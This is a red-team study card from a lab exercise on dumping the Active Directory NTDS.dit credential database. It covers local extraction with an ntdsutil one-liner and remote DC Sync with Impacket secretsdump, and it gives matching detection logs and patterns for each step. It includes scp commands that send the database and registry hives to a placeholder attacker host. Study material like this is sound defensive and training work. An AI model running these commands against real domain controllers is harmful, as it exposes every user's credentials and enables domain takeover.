---
{"dg-publish":true,"permalink":"/cards/red-team/ntds-dit-dumping/"}
---


~ [[cards/red-team/Credential Harvesting\|Credential Harvesting]]

## Summary
---
**What it is:** Extracting the New Technologies Directory Services (NTDS.dit) database from Active Directory Domain Controllers to obtain all domain user credentials, password hashes, and Kerberos keys, using either local dumping with ntdsutil or remote dumping via DC Sync.

**Scope:** This note covers local NTDS dumping using ntdsutil when you have physical/RDP access to a Domain Controller without credentials, and remote dumping via DC Sync when you have domain credentials with replication permissions. Both methods extract the complete AD credential database.

**Prerequisites:**

- [[Active Directory Domain Services\|Active Directory Domain Services]]
- [[cards/active-directory/DC Sync\|DC Sync]]
- [[cards/active-directory/NTDS Database Structure\|NTDS Database Structure]]
- Local method: Administrator access to Domain Controller (no domain credentials needed)
- Remote method: Domain account with replication permissions or Domain Admin credentials
- Understanding of AD database encryption (requires SYSTEM and SECURITY files)

**Risks & Limitations:**

- Local method requires stopping/accessing locked NTDS file
- Remote method requires specific AD replication permissions
- NTDS file size can be very large (GB+ in enterprise environments)
- Decryption requires system Boot Key from SECURITY file
- Local dumping creates forensic artifacts on DC
- Remote dumping generates replication traffic and DC logs
- Requires actual password for remote method (hash not sufficient for DC Sync)
## How It Works (2-4 lines)
---
New Technologies Directory Services (NTDS) is the Active Directory database containing all AD data including user objects, attributes, groups, and credentials stored in three tables: Schema (object types and relationships), Link (object attributes and values), and Data (users and groups). The NTDS.dit file located at `C:\Windows\NTDS` is encrypted and locked during normal DC operation to prevent extraction, requiring the system Boot Key from the SECURITY file for decryption. Administrators use ntdsutil for AD maintenance, snapshots, and DSRM password management, or rely on DRS replication for multi-DC synchronization. Attackers with local DC access use ntdsutil to create offline copies of NTDS.dit with required decryption keys, or use accounts with replication permissions to remotely request credential replication via DC Sync, mimicking legitimate domain controller replication to harvest all domain password hashes and Kerberos keys.

Key concept: [[cards/active-directory/NTDS Database Structure\|NTDS Database Structure]]

## Steps (Hands-On)
---

**Legend:**

- `{DC_HOSTNAME}` = Domain Controller hostname
- `{DC_IP}` = Domain Controller IP address
- `{DOMAIN}` = THM.red
- `{DOMAIN_ADMIN}` = bk-admin
- `{DOMAIN_ADMIN_PASSWORD}` = Domain admin password
- `{DUMP_PATH}` = C:\Temp
- `{NTDS_FILE}` = ntds.dit
- `{SYSTEM_FILE}` = SYSTEM
- `{SECURITY_FILE}` = SECURITY
- `{ATTACKER_IP}` = Attacker machine IP

**Context:** You want to extract all Active Directory credentials by dumping the NTDS.dit database. You have two scenarios: local access to DC without credentials, or domain credentials with replication permissions.

### Method 1: Local Dumping (No Credentials Required)
---
**Context:** You have Administrator access to Domain Controller but no domain credentials available. You will use Windows utilities to dump NTDS file and crack offline.

**Required Files:**

- `C:\Windows\NTDS\ntds.dit`
- `C:\Windows\System32\config\SYSTEM`
- `C:\Windows\System32\config\SECURITY`

---
#### 1. Create NTDS Dump Using Ntdsutil

**Action:**

- Execute ntdsutil one-liner to dump NTDS into `C:\Temp` directory:
```C
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

**Observable:**

- `powershell.exe` process execution
- `ntdsutil.exe` child process spawned from PowerShell
- Event ID 4688 (Process creation) - ntdsutil.exe
- NTDS service temporarily paused/accessed
- High disk I/O activity on DC
- Two folders created in `C:\Temp`:
  - **Active Directory** folder (contains ntds.dit)
  - **registry** folder (contains SYSTEM and SECURITY files)
- Event ID 4656 (Handle to object requested) - NTDS.dit file access
- Sysmon Event ID 11 (FileCreate):
  - TargetFilename: `C:\Temp\Active Directory\ntds.dit`
  - TargetFilename: `C:\Temp\registry\SYSTEM`
  - TargetFilename: `C:\Temp\registry\SECURITY`
- Large files created (ntds.dit size varies by domain size - MB to GB+)
- Event ID 4662 (Operation performed on AD object) if detailed auditing enabled

---
#### 2. Verify Dump Files

**Action:**

- Navigate to `C:\Temp` directory
- Verify two folders exist:
  - `Active Directory` (contains ntds.dit)
  - `registry` (contains SYSTEM and SECURITY)
- Confirm all three required files present

**Observable:**

- Directory listing operations
- File system enumeration
- `cmd.exe` or `explorer.exe` accessing C:\Temp
- Three critical files confirmed:
  - `C:\Temp\Active Directory\ntds.dit`
  - `C:\Temp\registry\SYSTEM`
  - `C:\Temp\registry\SECURITY`

---
#### 3. Transfer Files to Attacker Machine

**Action:**

- Transfer all three files to attacker machine
- If SSH available, navigate to directory and transfer:
```C
cd "C:\Temp\Active Directory"
```

```C
scp * root@{ATTACKER_IP}:/root/.
```

```C
cd "C:\Temp\registry"
```

```C
scp * root@{ATTACKER_IP}:/root/.
```

**Observable:**

- `scp.exe` or SSH client process execution
- Network connections to `{ATTACKER_IP}` on port 22 (SSH)
- Sysmon Event ID 3 (Network connection):
  - DestinationIp: `{ATTACKER_IP}`
  - DestinationPort: 22
- Large outbound file transfers (ntds.dit size + SYSTEM + SECURITY)
- Event ID 5140 (Network share accessed) if using SMB instead
- File read operations on ntds.dit, SYSTEM, SECURITY
- Sustained network traffic during large file transfer

---
#### 4. Extract Credentials Using Secretsdump

**Action:**

- On attacker machine, use Impacket's secretsdump.py to extract credentials:
```C
python3.9 /opt/impacket/examples/secretsdump.py -security ./SECURITY -system ./SYSTEM -ntds ./ntds.dit local
```

**Parameters:**

- **-security** - Path to SECURITY file (contains LSA secrets and Boot Key)
- **-system** - Path to SYSTEM file (contains additional decryption keys)
- **-ntds** - Path to ntds.dit database file
- **local** - Process local files (not network authentication)

**Observable:**

- Python process execution on attacker machine (no target observables)
- NTDS database decrypted using Boot Key from SECURITY file
- Output contains:
  - **Boot Key value** - important for forensics/verification
  - Domain user accounts with NTLM hashes
  - Kerberos keys (AES256, AES128, DES)
  - Computer account hashes
  - Service account credentials
  - Password history (if configured)
- Output format: `domain\username:RID:LM_hash:NTLM_hash:::`
- Complete domain credential database extracted offline

### Method 2: Remote Dumping (DC Sync)
----
**Context:** You have domain credentials with replication permissions. This method remotely dumps credentials by mimicking domain controller replication.

**Required Permissions:**

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

**Note:** For more detailed information on DC Sync permissions and attack mechanics, see: [[Persisting AD Task 2\|Persisting AD Task 2]]

---
#### 1. Execute Remote DC Sync

**Action:**

- Use Impacket's secretsdump.py with domain credentials to remotely sync NTDS:
```C
python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/bk-admin@10.49.138.117
```

**Parameters:**

- **-just-dc** - Extract only NTDS data (not registry or other secrets)
- **THM.red/bk-admin** - Domain and username with replication permissions (format: domain/user)
- **@10.49.138.117** - Target Domain Controller IP address
- **Note:** This requires actual password (not NTLM hash)

**Alternative for NTLM only:**
```C
python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/bk-admin@10.49.138.117
```

**Observable:**

- Python process execution on attacker machine
- Network connection from attacker to DC on port 135 (RPC)
- Additional dynamic high ports for DRS RPC communication
- Directory Replication Service (DRS) RPC calls to Domain Controller
- Event ID 4662 (Operation performed on AD object) on DC:
  - Object: Various user and computer objects
  - Properties: Replicating Directory Changes, Replicating Directory Changes All
  - Subject: `{DOMAIN_ADMIN}` account
- Event ID 4624 (Logon) on DC:
  - Logon Type 3 (Network)
  - Account: `{DOMAIN_ADMIN}`
  - Source: `{ATTACKER_IP}`
- Sustained RPC traffic during credential replication
- No file system artifacts on DC (pure network-based extraction)
- All domain credentials streamed directly to attacker machine
- Event ID 4673 (Sensitive privilege use) if detailed auditing enabled

---
#### 2. Review Extracted Credentials

**Action:**

- Review secretsdump output containing all domain credentials
- Identify high-value targets:
  - Domain Admin accounts
  - Service accounts
  - KRBTGT account hash (for Golden Ticket attacks)
  - Computer accounts with admin rights
  - Privileged group members

**Observable:**

- Offline credential review on attacker machine (no target observables)
- Complete domain credential database obtained
- NTLM hashes available for pass-the-hash attacks
- Kerberos keys available for ticket forging
- Password cracking can begin offline
- KRBTGT hash available for Golden Ticket persistence

## Blue - Detection & Response
---

**Key Logs:**

- Event ID 4688 (Process creation) - ntdsutil.exe, powershell.exe
- Event ID 4656 (Handle to object requested) - NTDS.dit file access
- Event ID 4662 (Operation performed on AD object) - Replication requests (remote method)
- Event ID 4624 (Logon) - Network logon from non-DC to DC (remote method)
- Event ID 4673 (Sensitive privilege use) - Replication permissions exercised
- Event ID 5140 (Network share accessed) - File exfiltration
- Sysmon Event ID 1 (Process creation) - ntdsutil.exe
- Sysmon Event ID 11 (FileCreate) - ntds.dit copied outside default location
- Sysmon Event ID 3 (Network connection) - File exfiltration or DRS RPC traffic
- DRS replication traffic from non-DC sources

**Detection Patterns:**

- Ntdsutil execution outside maintenance windows or by non-admin accounts
- NTDS.dit file copied to non-standard locations (Temp, Desktop, user directories)
- SYSTEM and SECURITY files exported simultaneously with NTDS
- DRS replication requests from workstations or member servers (not DCs)
- Account with replication permissions used interactively (not service account)
- Multiple Event ID 4662 in rapid succession from single source
- Large file transfers from DC to external systems
- Replication permissions exercised outside normal DC-to-DC replication
- ntdsutil creating IFM (Install From Media) sets on production DCs
- SSH/SCP connections from DC to external IPs

**High-Value Indicators:**

- NTDS.dit file outside `C:\Windows\NTDS` directory
- Event ID 4662 with subject account that is NOT a domain controller
- Source IP for replication request is workstation or non-DC server
- Replication of KRBTGT account by non-DC entity
- Files named `ntds.dit`, `SYSTEM`, `SECURITY` in Temp or user directories
- Ntdsutil execution followed by network file transfer within minutes
- Event ID 4662 with properties "Replicating Directory Changes All" from non-DC
- Multiple domain user accounts replicated in short timeframe (mass dump pattern)
- Secretsdump.py process artifacts if endpoint monitoring available
- Replication activity during non-business hours from non-DC sources

![[Pasted image 20251226102318.png\|Pasted image 20251226102318.png]]